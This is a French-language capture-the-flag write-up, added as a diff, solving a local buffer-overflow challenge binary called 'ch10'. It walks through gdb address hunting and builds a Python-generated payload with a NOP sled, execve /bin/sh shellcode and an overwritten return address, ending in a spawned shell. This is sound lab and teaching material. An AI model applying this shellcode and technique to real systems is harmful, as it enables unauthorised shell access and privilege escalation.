@@ -1,0 +1,61 @@
+Solution:
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x08\x04\xb0\x08"[::-1] + "\xbf\xff\xf7\xec"[::-1]*3' > /tmp/file
+
+Explications:
+Le programme s'execute seulement si le contenu du fichier commence par "USERNAME=":
+$ python -c 'print "USERNAME="
+
+On ecrit notre shellcode a la suite:
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+pourquoi 111 fois ?
+Struct Init = 128 + 4 + 4 = 136
+-> ("USERNAME=") 9 + ("\x90") 102 + ("\x31..\x08") 25 = 136
+On test le programe avec des valeurs de 102 + 4 a cahque fois jusqua ce que ca plante et on arrive a :
+$ python -c 'print "USERNAME=" + "\x90"*114 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/file && ./ch10 /tmp/file
+Segmentation fault
+
+Un coup de gdb nous montre d'une part que les bits ne sont pas alignes et que fgets() plante parce qu'on ecrase FILE *file.
+$ gdb ch10
+$ disas Init
+...
+0x080485c1 <+24>:	mov    DWORD PTR [esp],eax
+0x080485c4 <+27>:	call   0x8048480 <fopen@plt>        <- recuperation de la valeur de retour de fopen
+0x080485c9 <+32>:	mov    DWORD PTR [ebp-0x1c],eax
+...
+$ b *0x080485c9
+$ c
+$ p $eax
+$1 = 0x804b008											<- addresse de FILE *file.
+$ q
+$ python -c 'print "USERNAME=" + "\x90"*114 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x08\x04\xb0\x08"[::-1]' > /tmp/file && ./ch10 /tmp/file
+Segmentation fault (<- fgets()).
+
+On realigne les bits (114 - 3):
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x08\x04\xb0\x08"[::-1]' > /tmp/file && ./ch10 /tmp/file
+blablabla ca marche !
+
+OK fgets ne segfault plus.
+Maintenant il nous faut l'adresse de notre shellcode, a savoir l'addresse de buff[]:
+$ gdb ch10
+$ b Init
+$ r /tmp/file
+$ p &buff
+$2 = (char (*)[513]) 0xbffff7e3							<- addresse de buff[].
+
+Alors buff[] se situe en 0xbffff7e3, MAIS, buff commence par USERNAME=, DONC, il suffit d'ajouter 9 a l'adresse pour tomber sur le debut du shellcode:
+l'adresse sera 0xbffff7e3 + 9 = 0xbffff7ec.
+On s'en sort donc avec:
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x08\x04\xb0\x08"[::-1] + "\xbf\xff\xf7\xec"[::-1]' > /tmp/file
+[+] Runing the program with username ???????????????????????????????????????????????????????????????????????????????????????????????????????????????1?Ph//shh/bin??P??S??
+                                                                                                                                                                         ̀????֭? ???????, uid -511093790 and pid -2134045776.
+
+Arf. Pas de nouveau shell. Peut etre continuer a spammer l'addresse de buff[] + 9 fera qu'on ecrasera EIP:
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x08\x04\xb0\x08"[::-1] + "\xbf\xff\xf7\xec"[::-1]*8' > /tmp/file
+Illegal Instruction
+
+Ca sonne bien.
+$ python -c 'print "USERNAME=" + "\x90"*111 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x08\x04\xb0\x08"[::-1] + "\xbf\xff\xf7\xec"[::-1]*9' > /tmp/file
+sh-4.2$ 
+
+BINGO !
+
